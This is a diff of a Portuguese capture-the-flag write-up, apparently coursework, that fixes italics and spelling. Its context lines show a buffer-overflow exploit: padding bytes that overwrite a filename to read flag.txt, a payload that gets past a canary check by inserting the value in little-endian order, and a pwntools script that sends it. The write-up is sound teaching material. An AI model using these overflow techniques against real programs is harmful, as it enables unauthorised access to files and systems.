@@ -160,7 +160,7 @@ Decidimos que o input fornecido seria:
 11111111111111111111flag.txt
 ```
 
-Utilizámos o *script* em python fornecido:
+Utilizámos o *script* em *python* fornecido:
 ```py
 #!/usr/bin/python3
 from pwn import *
@@ -198,14 +198,14 @@ Após isto, analisámos o *source code* de modo a responder às questões levant
 3. É possivel ultrapassar a mitigação usando uma técnica similar à que foi utilizada anteriormente?
     - Sim.
 
-De modo a contornar a verficação extra basta enviar `0xfefc2122` entre os 20 caracteres iniciais e o `flag.txt`:
+De modo a contornar a verificação extra basta enviar `0xfefc2122` entre os 20 caracteres iniciais e o `flag.txt`:
 ```
 11111111111111111111\x22\x21\xfc\xfeflag.txt
 ```
 
 De notar que a ordem dos bytes de `0xfefc2122` foi trocada devido ao sistema ser *little-endian*.
 
-Mais uma vez utilizámos o script em python fornecido:
+Mais uma vez utilizámos o *script* em *python* fornecido:
 ```py
 #!/usr/bin/python3
 from pwn import *
@@ -222,7 +222,7 @@ r.sendline(b"11111111111111111111\x22\x21\xfc\xfeflag.txt")
 r.interactive()
 ```
 
-E realizámos o ataque:
+E realizámos o ataque:  
 ![/imgs5/ctf/flag2.png](/imgs5/ctf/flag2.png)
 
 (Nota (de novo): a *flag* submetida foi outra, dado que quando fizemos o *ctf* pela primeira vez
